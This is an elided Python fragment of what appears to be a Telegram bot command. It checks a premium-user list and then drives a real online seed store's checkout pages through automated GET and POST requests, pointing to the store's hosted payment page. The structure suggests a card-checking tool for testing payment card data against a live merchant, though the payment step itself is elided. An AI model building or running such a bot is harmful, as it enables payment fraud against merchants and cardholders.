...
async def ch(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        ...
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:
            ...
            r_1 = s.get('https://www.edenbrothers.com', params=params)
            ...
            r_2 = s.post('https://www.edenbrothers.com/checkout_3.php', params=params, data=data)
            ...
            r_3 = s.post('https://www.edenbrothers.com/checkout_4.php', data=data)
            ...
            headers = {
                ...
                'Origin': 'https://www.edenbrothers.com',
                'Referer': 'https://www.edenbrothers.com/',
            ...
            data = {
                'return_url': 'https://www.edenbrothers.com/checkout_5.php',
                'content_template_url': 'https://www.edenbrothers.com/hostedpage.htm',
                'cancel_url': 'https://www.edenbrothers.com/checkout_1.php',
                'max_user_retries': '3',
